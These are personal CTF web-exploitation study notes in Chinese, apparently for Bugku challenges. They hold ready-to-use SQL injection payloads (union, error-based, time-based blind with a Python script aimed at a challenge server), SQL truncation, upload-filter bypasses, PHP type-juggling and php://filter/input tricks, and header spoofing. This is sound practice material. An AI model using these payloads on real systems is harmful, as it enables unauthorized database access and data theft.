### 一般流程
1. 首先看header, veiwsource, 目录扫描
2. 有登陆, 尝试sql注入&爆破
3. 有数据库, 必然sql注入?

### 普通sql注入
0. 判断是否存在回显异常
尝试单双引号

1. 查是字符型?数值型?
若1'#成功查询, 则是字符型
若失败则是数值型

2. 确定字段数
1' order by 3# , 意思是按第三参数排序, 若报错则没有第三字段

3. 确定返回值类型(需要么?参见bugku学生管理)
0' union select 1, 2, 3, 4 #不可
0' union select '1', '2', '3', '4' #可

3. 确定offset
1' union select '1', '2', '3', '4' # 仅有id=1的数据
0' union select '1', '2', '3', '4' # 仅有1234数据

3. database()
4. information_schema.tables (使用group_concat)
5. information_schema.columns (使用group_concat)
6. 查字段

### 带字符串过滤的sql注入
1. 异或测试过滤
1'^(length('and')==0)
1'^(length('asdasd')==0)
测试结果若与下面的不同, 则存在and的过滤

2. 双写绕过, 大小写绕过

2. 空格过滤
/*x*/充当空格

3. 若上面的绕过union失效, 尝试updatexml(但需要异常回显)
1' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),3) %23

### sql约束攻击
类似与在提供了注册功能的同时, 需要登陆admin帐号的情况下使用
注册时:
username=admin                       a&&passwd=passwd
因为sql由于字符串长度限制, 所以查询时截断username, 误认为admin, 登陆
但实测user(name varchar(20))下insert数据, 长度过长会报错, 所以这种攻击是否有效就另说了?

# insert into类型sql注入
1. 基于时间的sql注入
'+"+"(select case when substr((select table_name from information_schema.tables where table_schema=(select database()) limit 1 offset 0) from 0 for 1)='a' then sleep(30) else 0 end)) #
```
import requests as req
from lxml import etree
import base64
from tqdm import tqdm

url='http://123.206.87.240:8002/web15/'
# payload="'+"+"(select case when substr((select table_name from information_schema.tables where table_schema=(select database()) limit 1 offset %d) from %d for 1)='%s' then sleep(30) else 0 end)) #"
payload="'+"+"(select case when substr((select * from flag from %d for 1)='%s' then sleep(30) else 0 end)) #"
dic="1234567890qwertyuiopasdfghjklzxcvbnm"

dbname="w111111111111111111"
tablename=[]

for ti in range(1):
    tmp=''
    for i in range(1, 21):
        check=False
        for ch in dic:
            try:
                print(payload%(i, ch))
                resp=req.get(url, headers={'X-Forwarded-For': payload%(i, ch)}, timeout=3)
            except:
                tmp+=ch
                print(tmp)
                check=True
                break

        if check==False: break
    tablename.append(tmp)
    print(tablename)

```
2. 基于regex的sql注入
详见:<https://blog.csdn.net/hwz2311245/article/details/53941523>

3. 基于异常的sql注入
链接同上

### 文件上传
此处用burpsuite操作
1. 请求头的Content-Type大小写绕过
2. 请求数据的Content-Type改为image/png等
3. 文件后缀黑名单php, php4, php5, phps, phtml, phtm绕过
4. 屏蔽<?php: 用<?= 或 <script language="php"></script>

### 绕过

1. x==0
字符串绕过

2. x==null
%20绕过

3. is_numeric(x)==false && x==1
1%00123 字符截断
1%20123 空格字符

(%00123 绕过is_numeric()==false,  x==1不能)
(%20123 不能绕过is_numeric()==false)

4. is_numeric(x)==true && sql注入
二次注入, x专成16进制即可
```
select hex('test');
-> 0x74657374 
```

5. md5(x) == md5(y) && x!=y
数组绕过x[]=x&y[]=y
sha1同理

6. md5(x) === md5(y)

7. strcmp($x, $flag)==0
Php5.3之后版本使用strcmp比较一个字符串和数组的话,将不再返回-1而是返回0

8. true == "0"
字符串绕过

### php技巧
1. GLOBALS变量

2. 文件包含 php://filter/read=convert.base64-encode/resource=flag.php

3. php://input
可将数据放入rawbody

4. 传数组burpsuite下
numbers[]="0,0,0"
numbers=[0,0,0]

### HTTP
1. X-Forwarded-For设置ip
事实上反代服务器也会写上XFF之类的header
X-Forwarded-For：Squid 服务代理
Proxy-Client-IP：apache 服务代理
WL-Proxy-Client-IP：weblogic 服务代理
HTTP_CLIENT_IP：有些代理服务器
X-Real-IP：nginx服务代理

### 编码
1. HTML编码
```
&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;
KEY{J2sa42ahJK-HS11III}
```

2. Base64


3. urlencode
```
// js
escape('!#') // "%21%23"
unescape('%21%23"') // !#
```

### 其他
1. 如何做到POST的同时给出GET参数?
postman: POST同时url上写GET参数, from-data写POST数据
hackbar: enable post data即可

2. JSFuck

### 问题
1. http://123.206.87.240:8006/test/hello.php?id=1
```
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("f4l2a3g.txt");
}
else
{
	print "never never never give up !!!";
}
?>

http://123.206.87.240:8006/test/hello.php?id=0&b=%004123123&a=php://input
```
为何id=0不能通过?

2. sql注入, 做到这里卡题了
http://123.206.87.240:9001/sql/
http://123.206.87.240:9001/sql/do_Everythin.php#